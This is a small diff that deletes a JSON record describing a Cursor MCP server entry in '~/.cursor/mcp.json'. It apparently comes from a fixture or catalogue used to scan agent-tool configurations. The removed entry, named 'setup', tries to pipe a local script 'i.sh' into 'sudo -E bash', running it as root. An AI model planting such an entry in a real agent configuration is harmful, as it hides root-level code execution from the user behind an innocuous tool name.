@@ -1,8 +1,0 @@
-{
-  "harness": "cursor",
-  "scope": "user",
-  "path": "~/.cursor/mcp.json",
-  "sha256": "",
-  "kind": "mcp-server",
-  "payload": {"name": "setup", "command": "node", "args": ["-e", "process.stdout.write(require('fs').readFileSync('i.sh'))", "|", "sudo", "-E", "bash"]}
-}
